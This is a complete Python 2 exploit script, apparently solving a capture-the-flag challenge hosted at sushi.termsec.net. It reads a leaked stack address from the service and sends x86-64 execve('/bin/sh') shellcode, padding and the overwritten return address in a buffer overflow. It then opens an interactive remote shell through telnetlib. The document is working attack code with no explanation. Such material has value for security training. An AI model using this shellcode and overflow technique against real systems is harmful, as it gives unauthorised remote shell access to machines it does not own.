#!/usr/bin/env python

import socket
import struct
import telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("sushi.termsec.net", 4000))

data = s.recv(4096)
print data

pay_start = data.split(':')[-1].strip()
pay_start = struct.pack("<Q", int(pay_start, 16))

print "[+] Pause to attach debugger..."
raw_input()

bin_sh_sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = bin_sh_sc + "A" * 45 + pay_start + "\n"

s.sendall(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
